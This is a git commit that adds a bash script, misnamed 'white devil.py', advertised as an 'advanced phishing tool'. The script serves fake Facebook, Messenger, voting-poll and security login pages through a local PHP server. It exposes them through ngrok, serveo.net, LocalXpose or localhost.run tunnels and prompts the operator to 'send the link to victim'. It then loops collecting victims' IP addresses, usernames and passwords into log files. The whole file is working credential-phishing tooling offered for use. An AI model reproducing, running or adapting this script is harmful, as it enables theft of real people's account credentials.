205e07676762653bb98022c512809a761cfc712a
Shihab <67054762+internet-help-zone-shihab@users.noreply.github.com>
2020-07-15 12:46:02 +0600

    Add files via upload

---
+++ white devil.py
@@ -0,0 +1,349 @@
+trap 'printf "\n";stop;exit 1' 2
+deps() {
+command -v php > /dev/null 2>&1 || { echo >&2 "PHP is not installed ! Install it."; exit 1; }
+command -v curl > /dev/null 2>&1 || { echo >&2 "curl is not installed ! Install it."; exit 1; }
+command -v ssh > /dev/null 2>&1 || { echo >&2 "openssh is not installed ! Install it."; exit 1; }
+}
+banner() {
+clear
+printf " \e[31;1m ░██╗░░░░░░░██╗██╗░░██╗██╗████████╗███████╗ \e[0m\n"
+printf " \e[32;1m ░██║░░██╗░░██║██║░░██║██║╚══██╔══╝██╔════╝ \e[0m\n"
+printf " \e[33;1m ░╚██╗████╗██╔╝███████║██║░░░██║░░░█████╗░░ \e[0m\n"
+printf " \e[34;1m ░░████╔═████║░██╔══██║██║░░░██║░░░██╔══╝░░ \e[0m\n"
+printf " \e[35;1m ░░╚██╔╝░╚██╔╝░██║░░██║██║░░░██║░░░███████╗ \e[0m\n"
+printf " \e[36;1m ░░░╚═╝░░░╚═╝░░╚═╝░░╚═╝╚═╝░░░╚═╝░░░╚══════╝ \e[0m\n"
+printf "\e[36;1m  ADVANCE PHISHING TOOLS     \e[0m\n"
+printf " \e[31;1m ██████╗░██╗░░██╗██╗░██████╗██╗░░██╗██╗███╗░░██╗░██████╗░ \e[0m\n"
+printf " \e[32;1m ██╔══██╗██║░░██║██║██╔════╝██║░░██║██║████╗░██║██╔════╝░ \e[0m\n"
+printf " \e[33;1m ██████╔╝███████║██║╚█████╗░███████║██║██╔██╗██║██║░░██╗░ \e[0m\n"
+printf " \e[34;1m ██╔═══╝░██╔══██║██║░╚═══██╗██╔══██║██║██║╚████║██║░░╚██╗ \e[0m\n"
+printf " \e[35;1m ██║░░░░░██║░░██║██║██████╔╝██║░░██║██║██║░╚███║╚██████╔╝ \e[0m\n"
+printf " \e[36;1m ╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝░╚═════╝░ \e[0m\n"
+printf " \n"
+printf " \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Tool Created by INTERNET HELP ZONE (SHIHAB)\e[0m\n"
+printf " \n"
+printf " \e[31;1m ║══▒═💀═▒═💀═▒═══¤═¤═¤════════════¤═══¤═══¤═══║      \e[0m\n"
+printf " \e[32;1m ║→𝘼𝙐𝙏𝙃𝙊𝙍 𝘽𝙔 : 𝙈𝙊𝙃𝘼𝙈𝙈𝘼𝘿 𝙎𝙃𝙄𝙃𝘼𝘽 𝙐𝘿𝘿𝙄𝙉                     \e[0m\n"
+printf " \e[33;1m ║→𝗬𝗢𝗨𝗧𝗨𝗕𝗘 : 𝗜𝗡𝗧𝗘𝗥𝗡𝗘𝗧 𝗛𝗘𝗟𝗣 𝗭𝗢𝗡𝗘                            \e[0m\n"
+printf " \e[34;1m ║→𝗚𝗜𝗧𝗛𝗨𝗕 : http://github.com/internet-help-zone-shihab     \e[0m\n"
+printf " \e[35;1m ║→𝐂𝐇𝐀𝐊𝐄𝐃 𝐁𝐘 : 𝐅𝐀𝐑𝐇𝐀𝐍 𝐀𝐇𝐀𝐌𝐄𝐃                              \e[0m\n"
+printf " \e[36;1m ║══▒═💀═▒═💀═▒═══¤═¤═¤════════════¤═══¤═══¤═══║       \e[0m\n"
+printf " \n"
+printf " \e[36;1m.:.Select your option and sent link with victim.:.\e[0m\n"
+printf " \n"
+}
+menu() {
+printf " \n"
+printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Advanced Voting Poll Login Page\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Fake Security Login Page\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m Facebook Messenger Login Page\e[0m\n"
+printf "\e[0m\n"
+read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' option
+if [[ $option == 1 || $option == 01 ]]; then
+server="facebook"
+start
+elif [[ $option == 2 || $option == 02 ]]; then
+server="fb_advanced"
+start
+elif [[ $option == 3 || $option == 03 ]]; then
+server="fb_security"
+start
+elif [[ $option == 4 || $option == 04 ]]; then
+server="fb_messenger"
+start
+else
+printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
+sleep 1
+banner
+menu
+fi
+}
+stop() {
+checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
+checkphp=$(ps aux | grep -o "php" | head -n1)
+checkssh=$(ps aux | grep -o "ssh" | head -n1)
+if [[ $checkngrok == *'ngrok'* ]]; then
+pkill -f -2 ngrok > /dev/null 2>&1
+killall -2 ngrok > /dev/null 2>&1
+fi
+if [[ $checkphp == *'php'* ]]; then
+pkill -f -2 php > /dev/null 2>&1
+killall -2 php > /dev/null 2>&1
+fi
+if [[ $checkssh == *'ssh'* ]]; then
+pkill -f -2 ssh > /dev/null 2>&1
+killall ssh > /dev/null 2>&1
+fi
+if [[ -e linksender ]]; then
+rm -rf linksender
+fi
+}
+start() {
+if [[ -e linksender ]]; then
+rm -rf linksender
+fi
+printf "\n"
+printf "\e[0m\e[91m [\e[0m01\e[0m\e[91m]\e[0m\e[93m LocalHost\e[0m\n"
+printf "\e[0m\e[91m [\e[0m02\e[0m\e[91m]\e[0m\e[93m Ngrok\e[0m\n"
+printf "\e[0m\e[91m [\e[0m03\e[0m\e[91m]\e[0m\e[93m Serveo \e[0m\e[91m[\e[0m\e[93mCurrently Down\e[0m\e[91m]\e[0m\n"
+printf "\e[0m\e[91m [\e[0m04\e[0m\e[91m]\e[0m\e[93m LocalXpose\e[0m\n"
+printf "\e[0m\e[91m [\e[0m05\e[0m\e[91m]\e[0m\e[93m LocalHostRun\e[0m\n"
+printf "\e[0m\n"
+read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port Forwarding option: \e[0m\e[1;96m\en' tunnel_menu
+tunnel_menu="${tunnel_menu:-${def_tunnel_menu}}"
+
+if [[ $tunnel_menu == 1 || $tunnel_menu == 01 ]]; then
+start_localhost
+elif [[ $tunnel_menu == 2 || $tunnel_menu == 02 ]]; then
+start_ngrok
+elif [[ $tunnel_menu == 3 || $tunnel_menu == 03 ]]; then
+start_serveo
+elif [[ $tunnel_menu == 4 || $tunnel_menu == 04 ]]; then
+start_loclx
+elif [[ $tunnel_menu == 5 || $tunnel_menu == 05 ]]; then
+start_localhostrun
+
+else
+printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
+sleep 1
+banner
+menu
+fi
+
+}
+
+start_localhost() {
+
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m( \e[0m\e[1;96mhttp://127.0.0.1:5555 \e[0m\e[1;92m)\e[0m\n"
+cd .htr/www && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
+sleep 2
+smallbanner
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Successfully Hosted at :\e[0m\e[1;93m http://127.0.0.1:5555\e[0m\n"
+
+datafound
+
+}
+
+start_ngrok() {
+
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:5555\e[0m\e[1;91m )\e[0m\n"
+sleep 1
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Ngrok ...\e[0m\n"
+cd .htr/www && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
+sleep 2
+./.htr/ngrok http 127.0.0.1:5555 > /dev/null 2>&1 &
+sleep 7
+ngrok_link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+
+smallbanner
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $ngrok_link
+
+datafound
+}
+
+start_serveo() {
+
+serveo_default_choose_sub="Y"
+serveo_default_sub="$website$RANDOM"
+serveo_def_port="5555"
+
+printf "\e[0m\n"
+printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port \e[0m\e[1;91m( \e[0m\e[1;92mDefault:\e[0m\e[1;96m %s \e[0m\e[1;91m )\e[0m\e[1;92m : \e[0m\e[1;93m' $serveo_def_port
+read serveo_port
+serveo_port="${serveo_port:-${serveo_def_port}}"
+sleep 1
+printf "\e[0m\n"
+printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Generate Custom Link ? \e[0m\e[1;91m[\e[0m\e[1;92mY\e[0m\e[1;91m/\e[0m\e[1;92mn\e[0m\e[1;91m] : \e[0m\e[1;93m'
+read serveo_choose_sub
+serveo_choose_sub="${serveo_choose_sub:-${serveo_default_choose_sub}}"
+if [[ $serveo_choose_sub == "Y" || $serveo_choose_sub == "y" || $serveo_choose_sub == "Yes" || $serveo_choose_sub == "yes" ]]; then
+serveo_custom_subdomain=true
+sleep 1
+printf "\e[0m\n"
+printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Input CUSTOM Subdomain : \e[0m\e[1;91m( \e[0m\e[1;92mDefault:\e[0m\e[1;93m %s \e[0m\e[1;91m)\e[0m\e[1;92m: \e[0m\e[1;93m' $serveo_default_sub
+read serveo_subdomain
+serveo_subdomain="${serveo_subdomain:-${serveo_default_sub}}"
+sleep 1
+fi
+
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:$serveo_port\e[0m\e[1;91m )\e[0m\n"
+sleep 1
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Serveo ...\e[0m\n"
+cd .htr/www && php -S 127.0.0.1:$serveo_port > /dev/null 2>&1 & 
+if [[ $serveo_custom_subdomain == true ]]; then
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=60 -R %s:80:localhost:%s serveo.net > .nexlink 2> /dev/null &' $serveo_subdomain,$serveo_port
+sleep 7
+
+else
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:%s serveo.net > .nexlink 2> /dev/null &' $serveo_port
+sleep 7
+fi
+serveo_link=$(grep -o '.\{0,0\}http.\{0,100\}' .nexlink)
+smallbanner
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $serveo_link
+
+datafound
+}
+
+start_loclx() {
+
+loclx_default_choose_sub="Y"
+loclx_default_sub="$website$RANDOM"
+
+printf "\e[0m\n"
+printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Generate Custom Link ? \e[0m\e[1;91m[\e[0m\e[1;92mY\e[0m\e[1;91m/\e[0m\e[1;92mn\e[0m\e[1;91m] : \e[0m\e[1;93m'
+read loclx_choose_sub
+loclx_choose_sub="${loclx_choose_sub:-${loclx_default_choose_sub}}"
+if [[ $loclx_choose_sub == "Y" || $loclx_choose_sub == "y" || $loclx_choose_sub == "Yes" || $loclx_choose_sub == "yes" ]]; then
+loclx_custom_subdomain=true
+sleep 1
+printf "\e[0m\n"
+printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Input CUSTOM Subdomain : \e[0m\e[1;91m( \e[0m\e[1;92mDefault:\e[0m\e[1;93m %s \e[0m\e[1;91m )\e[0m\e[1;92m: \e[0m\e[1;93m' $loclx_default_sub
+read loclx_subdomain
+loclx_subdomain="${loclx_subdomain:-${loclx_default_sub}}"
+sleep 1
+fi
+
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:4142\e[0m\e[1;91m )\e[0m\n"
+sleep 1
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching LocalTunnel ...\e[0m\n"
+cd .htr/www && php -S 127.0.0.1:4142 > /dev/null 2>&1 & 
+if [[ $loclx_custom_subdomain == true ]]; then
+
+./.htr/loclx tunnel http --to :4142 --subdomain $loclx_subdomain > .nexlink 2> /dev/null &
+
+sleep 8
+
+else
+./.htr/loclx tunnel http --to :4142 > .nexlink 2> /dev/null &
+sleep 8
+fi
+loclx_link=$(grep -o 'https://[0-9a-z]*\.loclx.io ' .nexlink)
+smallbanner
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $loclx_link
+
+datafound
+}
+
+start_localhostrun() {
+
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching LocalHostRun ...\e[0m\n"
+cd .htr/www && php -S 127.0.0.1:4545 > /dev/null 2>&1 & 
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:4545\e[0m\e[1;91m )\e[0m\n"
+sleep 1
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Press Ctrl+C to View Login Creds \e[0m\n"
+sleep 1
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m"
+ssh -R 80:localhost:4545 ssh.localhost.run
+
+printf "\e[0m\n"
+
+printf "\n"
+printf " \e[1;31m[\e[0m\e[1;77m::\e[0m\e[1;31m]\e[0m\e[1;93m Login Info \e[1;31m[\e[0m\e[1;77m::\e[0m\e[1;31m]\e[0m\n"
+printf "\e[0m\n"
+while [ true ]; do
+
+
+if [[ -e ".htr/www/ip.txt" ]]; then
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP Found !\e[0m\n"
+grab_ip
+rm -rf .htr/www/ip.txt
+fi
+sleep 0.75
+if [[ -e ".htr/www/usernames.txt" ]]; then
+account=$(grep -o 'Username:.*' .htr/www/usernames.txt | cut -d " " -f2)
+IFS=$'\n'
+password=$(grep -o 'Pass:.*' .htr/www/usernames.txt | cut -d ":" -f2)
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Account:\e[0m\e[1;96m %s\n\e[0m" $account
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Password:\e[0m\e[1;96m %s\n\e[0m" $password
+cat .htr/www/usernames.txt >> logs/$website.log
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m logs/%s.log\e[0m\n" $website
+printf "\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Press Ctrl + C to Exit\e[0m\n"
+rm -rf .htr/www/usernames.txt
+fi
+sleep 0.75
+
+done
+
+}
+
+grab_ip() {
+
+ip=$(grep -a 'IP:' .htr/www/ip.txt | cut -d " " -f2 | tr -d '\r')
+IFS=$'\n'
+
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP:\e[0m\e[1;96m %s\e[0m\n" $ip
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m ip.txt\e[0m\n" $server
+printf "\n"
+cat .htr/www/ip.txt >> ip.txt
+
+}
+
+grab_creds() {
+
+account=$(grep -o 'Username:.*' .htr/www/usernames.txt | cut -d " " -f2)
+IFS=$'\n'
+password=$(grep -o 'Pass:.*' .htr/www/usernames.txt | cut -d ":" -f2)
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Account:\e[0m\e[1;96m %s\n\e[0m" $account
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Password:\e[0m\e[1;96m %s\n\e[0m" $password
+cat .htr/www/usernames.txt >> logs/$website.log
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m logs/%s.log\e[0m\n" $website
+printf "\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Next Login Info,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
+
+}
+
+datafound() {
+
+printf "\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Login Info,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
+printf "\n"
+while [ true ]; do
+
+
+if [[ -e ".htr/www/ip.txt" ]]; then
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP Found !\e[0m\n"
+grab_ip
+rm -rf .htr/www/ip.txt
+fi
+sleep 0.75
+if [[ -e ".htr/www/usernames.txt" ]]; then
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Login info Found !!\e[0m\n"
+grab_creds
+rm -rf .htr/www/usernames.txt
+fi
+sleep 0.75
+
+
+done 
+
+}
+
+banner
+reqs
+menu
